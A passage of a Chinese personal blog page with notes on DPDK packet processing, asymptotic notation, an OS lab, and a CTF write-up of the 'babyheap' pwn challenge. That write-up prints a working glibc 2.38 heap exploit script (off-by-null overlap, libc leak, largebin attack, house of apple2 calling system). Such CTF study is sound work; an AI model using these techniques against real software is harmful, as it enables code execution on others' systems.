<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2022.png" alt="Untitled"></p>
<p>NIC中接收到数据包之后。该checkpoint应将数据包传递给eBPF程序，该程序将决定如何处理该数据包：丢弃该数据包(drop)或让其继续通过正常路径(pass). 就像这幅图一样</p>
<h2 id="DPDK-Data-Plane-Development-Kit-高性能包处理-kernel-bypass">DPDK(Data Plane Development Kit)高性能包处理(kernel bypass)</h2>
<h3 id="产生背景">产生背景</h3>
<p>传统框架的局限性：传统Linux/Unix系统中的协议栈对数据包的处理具有一定的局限性。网卡驱动程序运行在Linux的内核态，被动捕包的性能收到以下因素的影响。</p>
<p>内核态和用户态之间的内容拷贝，多线程调度，系统中断</p>
<p>互联网网络规模迅速扩张</p>
<p>高速网络应用开发的需求</p>
<h3 id="什么是DPDK">什么是DPDK</h3>
<p>基于linux运行，是一个快速处理数据包的函数库和驱动集合。</p>
<p>在用户态实现数据包的收发和处理，绕过了kernel协议栈对数据包的处理过程，也就是kernel bypass。</p>
<h3 id="DPDK关键技术">DPDK关键技术</h3>
<p>传统技术缺点：</p>
<p>硬件中断导致的线程/进程切换</p>
<p>内存拷贝</p>
<p>多处理器平台的CPU漂移</p>
<p>缓存失效</p>
<p><strong>UIO技术</strong></p>
<p>当然UIO现在也变成了linux的核心技术</p>
<p>UIO，即Userspace I/O内核驱动，它在Linux kernel的世界比较小众，主要服务于一些定制设备。<strong>UIO负责将中断和设备内存暴露给用户空间，然后再由UIO用户态驱动实现具体的业务。</strong></p>
<p>UIO干了什么事：</p>
<p>在内核区域放置了一段代码，用来监听硬件中断轮询 内核空间驱动</p>
<p>在用户空间实现了读取硬件设备内存，甚至硬件寄存器等 用户空间驱动</p>
<p>当然这个轮询(<strong>PMD</strong>)是流量大的时候处理的。</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2023.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2024.png" alt="Untitled"></p>
<p><strong>对于多核也有支持</strong></p>
<p>cpu affinity机制，将进程放在指定的CPU上尽量长地运行而不迁移到其他处理器，避免cpu cache missing，也减少了进程和线程地上下文切换，从而提高性能和效率。</p>
<p>使用NUMA亲和，避免CPU跨NUMA访问内存。CPU访问自己的物理地址(cache)，有较短的响应时间，俗称Local Access，如果要访问其他CPU attach的内存，就需要通过inter-connect通道来访问，要慢一些，俗称Remote Access，在DPDK中，可以灵活地使用Local Access和Remote Access来提高访问速度。</p>
<p><strong>大页表技术</strong></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2025.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2026.png" alt="Untitled"></p>
<p><strong>内存池技术</strong></p>
<p>DPDK在用户空间实现了一套精致的内存池拷贝技术，内核空间和用户空间的内存交互不需要进行拷贝，只做控制权转移，这样就减少了内存拷贝的开销。</p>
<p><strong>大页内存管理</strong></p>
<p>兼容上层API申请大内存(</p>
<p><strong>无锁环境队列</strong></p>
<p><strong>PMD技术</strong></p>
<p>无中断开销</p>
<h2 id="EBPF-XDP和DPDK的区别">EBPF/XDP和DPDK的区别</h2>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2027.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2028.png" alt="Untitled"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/06/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/06/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B01/" class="post-title-link" itemprop="url">算法笔记1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-06 22:08:00 / 修改时间：22:11:50" itemprop="dateCreated datePublished" datetime="2023-11-06T22:08:00+08:00">2023-11-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>948</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>算法设计与分析之数学基础</h1>
<h1>数学是算法的基础，这一章主要讲的是如何用数学描述算法的复杂度</h1>
<p>通常我们都知道用大O函数来描述算法的复杂度，但这一章给出了更多的概念。</p>
<h2 id="同阶函数">同阶函数</h2>
<p>$$<br>
同阶函数\Theta(g(n))<br>
$$</p>
<p>这个函数直观来讲就是用来处理复杂度</p>
<p>$$<br>
O(2n^2) = O(n^2)<br>
$$</p>
<p><strong>定义如下：</strong></p>
<p>$$<br>
\Theta(g(n))={f(n) | \exists c1, c2&gt;0, n0, \forall n&gt;n0, c_1g(n)\leq f(n)\leq c_2g(n)} 称为与g(n)同阶的函数集合。<br>
$$</p>
<p><strong>记住它是用来化简系数的就好理解了</strong></p>
<h2 id="低阶函数">低阶函数</h2>
<p>$$<br>
O(g(n))<br>
$$</p>
<p>这就是总所周知的大O函数，它是用来描述最坏情况的，也就是复杂度的上限。</p>
<p>如果</p>
<p>$$<br>
f(n) = O(n^k)<br>
$$</p>
<p>则称f(n)是多项式界限的，这个后面会用到</p>
<p><strong>定义如下</strong></p>
<p>$$<br>
O(g(n)) = {f(n)|\exists c &gt;0, n_0, \forall n&gt;n_0, 0\leq f(n)\leq cg(n)}<br>
$$</p>
<h2 id="高阶函数">高阶函数</h2>
<p>$$<br>
\Omega(g(n))<br>
$$</p>
<p>高阶函数和低阶函数恰恰相反，用来描述最好情况的。</p>
<p><strong>定义如下：</strong></p>
<p>$$<br>
\Omega(g(n)) = {f(n)|\exists c&gt;0, n_0, \forall n \geq n_0, 0\leq cg(n)\leq f(n)}<br>
$$</p>
<h3 id="这里有个小考点">这里有个小考点</h3>
<p>对于描述运行时间必须完全准确</p>
<p>$$<br>
– 最好运行时间是 \Omega(n)<br>
– 最坏运行时间是 \Omega(n2)<br>
– 或者说，运行时间是\Omega(n)<br>
– 或者说，运行时间是O(n2)<br>
– 但是说运行时间是\Omega(n2)则有误<br>
$$</p>
<h2 id="严格低阶函数">严格低阶函数</h2>
<p>这个和低阶函数唯一的区别就是不可以等于上界…</p>
<p>符号是这个：</p>
<p>$$<br>
o(g(n))<br>
$$</p>
<h2 id="严格高阶函数">严格高阶函数</h2>
<p>这个和高阶函数唯一的区别就是不可以等于下界…</p>
<p>符号是这个：</p>
<p>$$<br>
\omega(g(n))<br>
$$</p>
<h3 id="注意这些比较都必须满足一个条件就是f-n-是多项式界限的，比如下面这个函数就不行。">注意这些比较都必须满足一个条件就是f(n)是多项式界限的，比如下面这个函数就不行。</h3>
<p>$$<br>
n^(1+sin(n))<br>
$$</p>
<h1>求解复杂度/计算复杂度的常用方法</h1>
<h2 id="数学归纳法">数学归纳法</h2>
<p>$$<br>
证明\Sigma_{k=0}<sup>n3</sup>k = O(3^k)<br>
$$</p>
<p>$$<br>
证明对于c \geq \frac{3}{2}, 存在一个n_0，当n \geq n_0的时候，\Sigma_{k=0}<sup>n3</sup>k \leq c3^n.<br>
$$</p>
<p>$$<br>
当n=0的时候，1 &lt;= \frac{3}{2}成立。<br>
$$</p>
<p>$$<br>
先假设当n\leq m的时候成立，令n=m+1,则\Sigma_{k=0}<sup>{m+1}3</sup>k = \Sigma_{k=0}<sup>m3</sup>k + 3^{m+1} \leq c3<sup>m+3</sup>{m+1} = (\frac{c}{3}+1)3^{m+1}<br>
$$</p>
<p>$$<br>
对于(\frac{c}{3}+1)3^{m+1}，有c\geq \frac{3}{2}，则(\frac{c}{3}+1)\geq \frac{3}{2}=c，所以此时的等价于c3^{m+1}<br>
$$</p>
<p>$$<br>
所以对于n=m+1的时候假设同样成立，根据数学归纳法可以知\Sigma_{k=0}<sup>n3</sup>k = O(3^k)<br>
$$</p>
<h2 id="利用放缩法求大致值">利用放缩法求大致值</h2>
<p>这个求的是否准确，很看放缩的功底。</p>
<p>思路是切线渐进，可以回顾高中数学。</p>
<p>ppt上例题：</p>
<p><img src="./images/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90%E4%B9%8B%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%20e4d9615bb3e04c7e933563df4e87e2c0/Untitled.png" alt="Untitled"></p>
<p>还可以通过下一项和上一项比较的方式，如果发现是单调递减的，可以知道必小于n*a0</p>
<p>因为求存在同阶函数，所以求阶可以大致求，不需要像高中那样求出完全相等的式子。</p>
<p>有些级数必须记住</p>
<p><img src="./images/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90%E4%B9%8B%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%20e4d9615bb3e04c7e933563df4e87e2c0/Untitled%201.png" alt="Untitled"></p>
<h2 id="求积分法锁定区间">求积分法锁定区间</h2>
<p>方法原理如下：</p>
<p><img src="./images/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90%E4%B9%8B%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%20e4d9615bb3e04c7e933563df4e87e2c0/Untitled%202.png" alt="Untitled"></p>
<h1>递归方程的算法复杂度分析</h1>
<p>这里介绍Master定理，貌似可以通杀所有计算题</p>
<p>$$<br>
目的：求阶T(n)=aT(\frac{n}{b})+f(n)方程，a\geq 1, b&gt;0是常数，f(n)是正函数<br>
$$</p>
<p>$$<br>
1.f(n)=O(n^{log_b{a-\varepsilon}})，则\exists \varepsilon&gt;0,那么T(n) = \Theta(n^{log_ba})<br>
$$</p>
<p>$$<br>
2.f(n)=\Theta(n<sup>{log_ba})，那么T(n)=\Theta(n</sup>{log_ba}logn)<br>
$$</p>
<p>$$<br>
3.f(n)=\Omega(n^{log_ba+\varepsilon}),\exists \varepsilon&gt;0,且对于某个常数c&lt;1和足够大的n，有af(\frac{n}{b})\leq cf(n)，那么T(n)=\Theta(f(n))<br>
$$</p>
<p>更进一步：</p>
<p><img src="./images/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90%E4%B9%8B%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%20e4d9615bb3e04c7e933563df4e87e2c0/Untitled%203.png" alt="Untitled"></p>
<p>缺陷：</p>
<p><img src="./images/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90%E4%B9%8B%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%20e4d9615bb3e04c7e933563df4e87e2c0/Untitled%204.png" alt="Untitled"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bbabyheap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bbabyheap/" class="post-title-link" itemprop="url">鹏城杯初赛babyheap</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-05 18:27:09 / 修改时间：18:29:31" itemprop="dateCreated datePublished" datetime="2023-11-05T18:27:09+08:00">2023-11-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>鹏城杯初赛一道好题 babyheap</h1>
<p>libc 2.38版本</p>
<p>打法是off_by_null触发overlap，堆块重叠之后再overlap一次，推动指针重叠，然后leak libc，最后打house of apple 2</p>
<p>比赛的时候太久没打过off by null了有点生疏了 卡在了leak libc那里</p>
<p>好好复习一遍</p>
<h1>off by null触发overlap</h1>
<p><img src="./images/temp%2077d417231b614ce1a1ba3e921b83cd82/Untitled.png" alt="Untitled"></p>
<p>看着这张图来打吧</p>
<p>目的有两个</p>
<p>第一个fake_chunk需要满足largebin对的双向链表检测</p>
<h2 id="目的是要实现H1合并到我们伪造的堆块，实现unlink-overlap出来一个大堆块">目的是要实现H1合并到我们伪造的堆块，实现unlink overlap出来一个大堆块</h2>
<p>为了实现目标我们要绕过的检测：</p>
<h3 id="校验一">校验一</h3>
<p>伪造的堆块必须满足largebin的双向链表检验：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">victim→bk→fd = victim</span><br><span class="line"></span><br><span class="line">victim→fd→bk = victim</span><br></pre></td></tr></table></figure>
<h3 id="校验二">校验二</h3>
<p>要满足H1对的presize == fake_chunk的size</p>
<h2 id="第一步：伪造合法的fake-chunk的fd和bk指针">第一步：伪造合法的fake_chunk的fd和bk指针</h2>
<p>我们只需要依次delete A、delete C0、delete D即可在C0处借用unsortedbin的双向链表特性构建好fd和bk。</p>
<p>这里我们可以顺便deleteB0，然后add一个B1构造好我们所需要的B1和C1也就是构造好我们的fake_chunk的size</p>
<h2 id="第二步：构造A→bk-fake-chunk">第二步：构造A→bk = fake_chunk</h2>
<p>这个比较简单，只需要delete A、delete C1，通过off by null即可ADD(A, b’a’*8)即可实现(这里有个小tips就是要保证C0的地址必须为xx00)</p>
<h2 id="第三步：构造D→fd-fake-chunk">第三步：构造D→fd = fake_chunk</h2>
<p>这个也比较简单，只需要delete C1、delete D、 delete H(类似第二步</p>
<h2 id="第四步：Barrier的off-by-null改写H1的head">第四步：Barrier的off by null改写H1的head</h2>
<p>此时我们已经实现了fake_chunk的完全构造，这个时候通过barrier的off by null即可改写H1的presize和size，这里注意H1大小必须刚好0x501/0x401这类的，为了保证delete的时候对下一个堆头的校验。而且off by null也会改写成0x500 完美！</p>
<h2 id="第五步：delete-H1触发overlap">第五步：delete H1触发overlap</h2>
<p>这个时候overlap的堆块就有C0、barrier、H1</p>
<p>注意我们现在拥有的指针仅有barrier，当然C0可以申请回来，H1也可以申请回来(理论</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># initial make sure C0_base = xx00</span><br><span class="line">add(0x418, b&#x27;A&#x27;*0x100) # A</span><br><span class="line">add(0x4e8, b&#x27;barrier&#x27;) # barrier</span><br><span class="line">add(0x438, b&#x27;B0&#x27;*0x100) # B0</span><br><span class="line">add(0x438, b&#x27;C0&#x27;*0x100) # C0</span><br><span class="line">add(0x408, b&#x27;barrier&#x27;) # barrier</span><br><span class="line">add(0x4e8, b&#x27;H0&#x27;*0x100) # H0 # 0x488</span><br><span class="line">add(0x448, b&quot;D&quot;*0x100) # D</span><br><span class="line">add(0x408, b&#x27;barrier&#x27;) # barrier</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;step 1&quot;&quot;&quot; # fake_chunk -&gt; fd || fake_chunk -&gt; bk</span><br><span class="line">delete(0) # delete A</span><br><span class="line">delete(3) # delete C0</span><br><span class="line">delete(6) # delete D</span><br><span class="line"></span><br><span class="line">delete(2) # delete B0</span><br><span class="line">add(0x458, b&#x27;1&#x27;*0x438 + p16(0x851)) # add B1 and set fake_chunk size == C0 + barrier + 1 * header_size</span><br><span class="line">add(0x418, b&#x27;C1&#x27;) # add C1</span><br><span class="line">add(0x418, b&#x27;A&#x27;) # recover A</span><br><span class="line">add(0x448, b&#x27;D&#x27;) # recover D</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;step2&quot;&quot;&quot; # A-&gt;bk = fake_chunk</span><br><span class="line">delete(3) # delete A</span><br><span class="line">delete(2) # delete C1</span><br><span class="line">add(0x418, b&#x27;a&#x27;*8) # recover A and off by null make A-&gt;bk = fake_chunk</span><br><span class="line">add(0x418, b&#x27;C1&#x27;) # recover C1</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;step 3&quot;&quot;&quot; # D-&gt;fd = fake_chunk</span><br><span class="line">delete(3) # delete C1</span><br><span class="line">delete(6) # delete D</span><br><span class="line">delete(5) # delete H</span><br><span class="line"></span><br><span class="line">add(0x4f8, b&#x27;1&#x27;*0x4e8 + b&#x27;b&#x27;*8) # add H1 overwrite D-&gt;fd</span><br><span class="line">add(0x438, b&#x27;1&#x27;) # recover D1</span><br><span class="line">add(0x418, b&#x27;1&#x27;) # recover C1</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;step 4&quot;&quot;&quot; # Barrier off by null rewrite H1 presize</span><br><span class="line">delete(4) # delete barrier</span><br><span class="line">add(0x408, b&#x27;a&#x27;*0x400 + p64(0x850)) # barrier off by null presize must equal to fake_chunk size</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;overlap&quot;&quot;&quot;</span><br><span class="line">delete(3)</span><br></pre></td></tr></table></figure>
<p>这个模板实现效果是：</p>
<p>overlap的堆块大小为0xd50</p>
<p>在偏移0x20的地方我们有一个指针</p>
<p>在偏移0x440的地方我们有第二个指针</p>
<h1>堆块重叠后再次overlap</h1>
<p>目的就是leak</p>
<p>先将堆块消耗完，然后通过堆块重叠复写size，要注意改写的size，需要满足addr+size是一个合法堆头</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;leak&quot;&quot;&quot;</span><br><span class="line">add(0x460, b&#x27;1&#x27;) # over the second point</span><br><span class="line">add(0x420, b&#x27;2&#x27;) # fill</span><br><span class="line">add(0x4a8, b&#x27;3&#x27;) # final fill</span><br><span class="line"></span><br><span class="line">add(0x500, b&#x27;extra to the end&#x27;) # extra to the end</span><br><span class="line"># the new size is the extra - modify one 0x0000556ab0f695b0 - 0x0000556ab0f68480 = 0x1130</span><br><span class="line">delete(4) # delete second point</span><br><span class="line">add(0x408, b&#x27;a&#x27;*0x28 + p64(0x1131)) # resize for the next overlap</span><br><span class="line">delete(8) # overlap</span><br><span class="line"></span><br><span class="line"># now the target is to push the new overlap to the final fill</span><br><span class="line">add(0x428, b&#x27;1&#x27;) # push 1 now is in the position</span><br><span class="line">add(0x4a8, b&#x27;3&#x27;) # fill and make points</span><br><span class="line">add(0x430, b&#x27;4&#x27;) # fill</span><br><span class="line">add(0x408, b&#x27;5&#x27;) # fill the last overlap chunk</span><br><span class="line"></span><br><span class="line"># start!</span><br><span class="line">delete(9) # delete</span><br><span class="line">add(0x500, b&#x27;111&#x27;) # make it to large bin</span><br><span class="line"></span><br><span class="line"># leak!</span><br><span class="line">show(11)</span><br><span class="line"></span><br><span class="line">leak_libc = leak()</span><br><span class="line">log(hex(leak_libc))</span><br><span class="line"></span><br><span class="line">libc_base = leak_libc - (0x7f44f45ff110 - 0x7f44f4400000)</span><br><span class="line">log(hex(libc_base))</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">fd = libc_base + (0x00007f3e455ff110 - 0x7f3e45400000)</span><br><span class="line">fd_nextsize = heap_base + (0x000055f95094c8a0 - 0x55f95094b000)</span><br><span class="line"># recover</span><br><span class="line">add(0x4a8, b&#x27;1&#x27;)</span><br></pre></td></tr></table></figure>
<h1>largebin attack &amp; house of apple2</h1>
<p>这部分比较简单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;large bin attack &amp; house of apple&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># apple:</span><br><span class="line"># def house_of_apple2(_IO_wfile_jumps, wide_data_entry, wide_data_vtable_entry, RIP):</span><br><span class="line"># return (fake_IO_FILE, pad, payload)</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line">RIP = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">wide_data_entry = heap_base + (0x000055e96ba93460 - 0x55e96ba90000) # 下面的第一个0x500</span><br><span class="line">wide_data_vtable_entry = heap_base + (0x000056024a7a5970 - 0x56024a7a2000) # 下面的第二个0x500</span><br><span class="line">payloads = house_of_apple2(_IO_wfile_jumps, wide_data_entry, wide_data_vtable_entry, RIP)</span><br><span class="line">fake_IO_FILE = payloads[0]</span><br><span class="line">pad = payloads[1]</span><br><span class="line">payload = payloads[2]</span><br><span class="line"></span><br><span class="line"># large bin attack</span><br><span class="line">add(0x480, b&#x27;1&#x27;)</span><br><span class="line">delete(14) # delete the larger one</span><br><span class="line">add(0x500, pad) # put it into largebin</span><br><span class="line">delete(15) # delete the small one</span><br><span class="line">edit(11, 0x20, p64(fd)*2 + p64(fd_nextsize) + p64(IO_list_all-0x20)) # edit bk_nextsize = target - 0x20</span><br><span class="line">add(0x500, payload) # 15</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">add(0x480, b&#x27;1&#x27;) # make IO_list_all to we can control</span><br><span class="line"></span><br><span class="line">edit(8, 0x428, b&#x27;a&#x27;*0x420 + p64(0x68732020)) # edit flag</span><br><span class="line">edit(11, len(fake_IO_FILE)-0x10, fake_IO_FILE[0x10:])</span><br><span class="line">bpp()</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/02/os%E5%AE%9E%E9%AA%8Clab2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/02/os%E5%AE%9E%E9%AA%8Clab2/" class="post-title-link" itemprop="url">os实验lab2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-02 20:55:48 / 修改时间：20:56:38" itemprop="dateCreated datePublished" datetime="2023-11-02T20:55:48+08:00">2023-11-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">操作系统</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>os实验lab2</h1>
<h1>OS操作系统lab2实验报告</h1>
<h2 id="1-当执行完-system-interrupt-函数，执行-153-行-iret-时，记录栈的变化情况。">1. 当执行完 <code>system_interrupt</code> 函数，执行 <code>153</code> 行 <code>iret</code> 时，记录栈的变化情况。</h2>
<p>执行前：</p>
